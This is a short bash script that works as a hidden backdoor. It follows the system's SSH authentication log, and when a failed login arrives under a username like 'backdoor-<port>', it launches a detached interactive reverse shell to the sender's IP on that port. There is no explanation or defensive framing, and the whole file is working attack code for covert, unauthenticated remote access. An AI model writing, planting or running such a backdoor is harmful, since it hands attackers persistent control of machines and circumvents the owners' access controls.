#!/bin/bash

tail -f /var/log/auth.log | 
while IFS= read -r; do
	if [[ $REPLY == *"Invalid user backdoor-"* ]]; then
		stringarray=($REPLY)
		IP=${stringarray[-1]}
		
		USER=${stringarray[-3]}
		IFS='-' read -ra PORT <<< "$USER"
		PORT=${PORT[-1]}
	
		screen -md bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
	fi
done
